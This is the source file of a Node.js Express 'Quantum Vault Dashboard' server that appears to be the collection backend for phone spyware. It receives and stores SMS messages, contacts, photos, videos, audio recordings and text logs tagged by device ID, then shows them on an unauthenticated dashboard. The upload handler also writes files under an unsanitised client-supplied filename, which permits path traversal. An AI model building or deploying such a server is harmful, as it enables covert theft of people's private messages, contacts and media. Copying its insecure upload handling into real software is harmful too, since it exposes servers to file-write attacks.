const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const moment = require('moment');

const app = express();
const PORT = 5000;

// Setup directories
const uploadDirs = ['audios', 'contacts', 'photos', 'videos', 'others'];
uploadDirs.forEach(dir => {
    const dirPath = path.join(__dirname, 'uploads', dir);
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }
});

const dataFile = path.join(__dirname, 'data.json');
if (!fs.existsSync(dataFile)) {
    fs.writeFileSync(dataFile, JSON.stringify({ texts: [], sms: [], files: [] }));
}

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Helper to read/write data
const readData = () => JSON.parse(fs.readFileSync(dataFile, 'utf8'));
const writeData = (data) => fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));

// Raw body parser for file uploads
const rawBodySaver = (req, res, next) => {
    if (req.headers['content-type'] === 'application/octet-stream') {
        let filename = 'unknown_file';
        const disposition = req.headers['content-disposition'];
        if (disposition && disposition.includes('filename="')) {
            filename = disposition.split('filename="')[1].split('"')[0];
        }
        
        let folder = 'others';
        if (req.path === '/upload_audios') folder = 'audios';
        else if (req.path === '/upload_contacts') folder = 'contacts';
        else if (req.path === '/upload_photos') folder = 'photos';
        else if (req.path === '/upload_videos') folder = 'videos';

        const filePath = path.join(__dirname, 'uploads', folder, Date.now() + '_' + filename);
        const writeStream = fs.createWriteStream(filePath);
        
        req.pipe(writeStream);
        
        req.on('end', () => {
            const data = readData();
            data.files.push({
                filename: filename,
                path: `/uploads/${folder}/${path.basename(filePath)}`,
                type: folder,
                timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
            });
            writeData(data);
            res.status(200).send("File Uploaded");
        });
        
        req.on('error', (err) => {
            console.error(err);
            res.status(500).send("Error uploading file");
        });
    } else {
        next();
    }
};

app.use(rawBodySaver);

// Endpoints
app.post('/upload_text', (req, res) => {
    const { type, data } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    
    const db = readData();
    db.texts.push({
        type: type || 'Log',
        data: data || '',
        deviceId,
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
    });
    writeData(db);
    
    res.status(200).send("Text logged successfully");
});

app.post('/upload_sms', (req, res) => {
    const { sender, message, timestamp } = req.body;
    const db = readData();
    
    db.sms.push({
        sender: sender || 'Unknown',
        message: message || '',
        original_timestamp: timestamp,
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
    });
    
    // Keep only last 500 sms
    if (db.sms.length > 500) db.sms.shift();
    
    writeData(db);
    res.status(200).send("SMS logged successfully");
});

// Any file upload endpoints (handled by rawBodySaver)
app.post('/upload_audios', (req, res) => {});
app.post('/upload_contacts', (req, res) => {});
app.post('/upload_photos', (req, res) => {});
app.post('/upload_videos', (req, res) => {});

app.get('/', (req, res) => {
    const db = readData();
    // Reverse arrays for latest first
    const viewData = {
        texts: [...db.texts].reverse(),
        sms: [...db.sms].reverse(),
        files: [...db.files].reverse()
    };
    res.render('index', { data: viewData });
});

app.listen(PORT, () => {
    console.log(`🚀 Quantum Vault Dashboard running on http://localhost:${PORT}`);
});
